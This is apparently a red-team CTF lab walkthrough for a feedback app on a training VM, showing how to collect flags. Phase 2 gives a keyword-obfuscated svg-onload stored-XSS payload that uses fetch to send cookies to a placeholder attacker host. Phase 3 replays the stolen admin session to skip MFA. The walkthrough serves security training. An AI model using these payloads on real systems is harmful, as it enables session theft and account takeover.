# Red Team Walkthrough — "Cookies Reuse & MFA Bypass"

Target: `http://<VM-IP>:3075` (internal name `feedback.admin.local`).
Attacker: any host that can reach the VM, with a listener reachable from the bot.

---

## Phase 1 — Reconnaissance

**(a) Backend fingerprint.** The response advertises the stack:

```bash
curl -i http://feedback.admin.local:3075/
# HTTP/1.1 200 OK
# X-Powered-By: Node.js (Express)
```
→ `SCENARIO75{Node.js}`

**(b) robots.txt.** Crawlers are told where *not* to go:

```bash
curl -s http://feedback.admin.local:3075/robots.txt
# User-agent: *
# Disallow: /api/verify-mfa
# Disallow: /dashboard
```
→ `SCENARIO75{robots.txt}`, `SCENARIO75{/api/verify-mfa}`, `SCENARIO75{/dashboard}`

**(c) Source-code hint.** The page contains an ASCII-art comment pointing at
robots.txt (`View Source` / `curl -s .../ | grep -i robots`).

**(d) Session initialisation.** The first request issues a pre-auth cookie that is
**not** HttpOnly — readable from JavaScript:

```bash
curl -i http://feedback.admin.local:3075/ | grep -i set-cookie
# Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/
```
→ `SCENARIO75{pre_mfa_session}`, `SCENARIO75{pending_mfa_verification}`, `SCENARIO75{False}`

---

## Phase 2 — Defense Evasion (WAF bypass)

The WAF in front of `/api/feedback` is naive. Confirm the block first:

```bash
curl -i -X POST http://feedback.admin.local:3075/api/feedback \
     --data-urlencode 'author=tester' \
     --data-urlencode 'message=<script>alert(1)</script>'
# HTTP/1.1 403 Forbidden   ← WAF blocked the <script> tag
# (error.log records the block)
```
→ `SCENARIO75{403}`, method is POST-only → `SCENARIO75{POST}`

The WAF also blocks the raw keywords `document` and `cookie`, so a payload cannot
say `document.cookie` directly. Bypass it by combining:

- an **HTML5 `<svg onload>`** element (not `<script>`),
- **bracket-notation** string building for the cookie,
- the **`fetch`** API to ship it out.

```bash
curl -i -X POST http://feedback.admin.local:3075/api/feedback \
  --data-urlencode 'author=pwn' \
  --data-urlencode "message=<svg onload=\"fetch('http://ATTACKER:8899/?c='+encodeURIComponent(window['docu'+'ment']['coo'+'kie']))\">"
# HTTP/1.1 200 OK   ← accepted (stored)
```
→ `SCENARIO75{<svg>}`, `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`, `SCENARIO75{fetch}`

Start the capture listener **before** submitting:

```bash
python3 exploit/exfil_server.py --port 8899
```

---

## Phase 3 — Initial Access (cookie replay → MFA bypass)

The admin bot periodically signs in (with MFA) and opens `/dashboard` to review the
feedback queue. When it renders our stored payload, the `<svg onload>` fires and the
browser posts its cookie bundle to our listener.

```bash
# wait for the bot
python3 exploit/red_team_exploit.py --target http://feedback.admin.local:3075 \
                                    --attacker http://ATTACKER:8899
# [exfil] STOLEN COOKIE: pre_mfa_session=pending_mfa_verification; adm_sess=adm_sess_<hex>
```

Replay the stolen `adm_sess` token. Because the backend only checks that the bearer
token is valid — it never re-verifies the MFA state — the `/api/verify-mfa` step is
skipped completely:

```bash
bash exploit/replay_cookie.sh http://feedback.admin.local:3075 adm_sess_<hex>
# SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```
→ `SCENARIO75{adm_sess}`, `SCENARIO75{/api/verify-mfa}` (skipped),
`SCENARIO75{xss-payload}` (the reflecting container), and the final flag
**`SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`**.

---

## Manual (browser) variant

1. Open `http://feedback.admin.local:3075/`, submit the `<svg onload>` payload in the
   feedback form.
2. Wait for the admin to review the dashboard (the bot signs in every ~20 s).
3. Read the stolen cookie on your listener, then set it in the browser
   (DevTools → Application → Cookies → `adm_sess=<stolen>`) and open `/dashboard`.
4. The final flag is displayed at the top of the dashboard.
